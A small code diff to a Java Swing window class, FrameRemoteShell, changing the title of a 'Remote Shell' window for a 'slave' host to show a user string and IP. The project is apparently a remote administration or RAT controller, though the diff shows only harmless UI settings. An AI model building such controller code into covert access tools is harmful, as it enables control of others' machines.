@@ -46,7 +46,7 @@ public class FrameRemoteShell extends BaseFrame {
 			}
 		});
 		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteShell.class.getResource("/icons/cmd.png")));
-		setTitle("Remote Shell - " + slave.getIP() + " - " + slave.getComputerName());
+		setTitle("Remote Shell - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
 		final Slave sl = slave;
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 499, 302);
